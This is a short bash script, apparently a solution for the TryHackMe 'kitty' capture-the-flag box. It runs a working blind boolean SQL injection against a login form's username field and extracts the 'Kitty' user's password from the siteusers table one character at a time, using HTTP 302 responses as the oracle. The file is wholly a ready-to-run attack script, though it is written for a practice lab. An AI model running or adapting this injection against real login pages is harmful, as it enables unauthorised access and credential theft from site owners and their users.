#!/bin/bash

#For THM box 'kitty'

IP=x.x.x.x #replace with desired IP
URL="http://${IP}/index.php"
flag=0
password=""
found_char=0
i=1

while [ "$flag" -eq 0 ]; do
	for char in {a..z} {A..Z} {0..9} "_"
	do
		found_char=0
		if [ "$password" == "" ];then
			temp_name="${char}"
		else
			temp_name="${password}${char}"
		fi
	
		payload="username=Kitty' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = database() AND table_name='siteusers' AND column_name='password' AND SUBSTRING((SELECT BINARY password FROM siteusers WHERE username='Kitty'),1,$i)='${temp_name}')-- -&password=somethingrandom"

		RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "${payload}" "${URL}")

		if [ "$RESPONSE_CODE" == "302" ]; then
			password="${temp_name}"
			found_char=1
			((i++))
			break
		fi
	done
	if [ "$found_char" -eq 0 ];then
		flag=1
	fi
done

echo "password: $password"
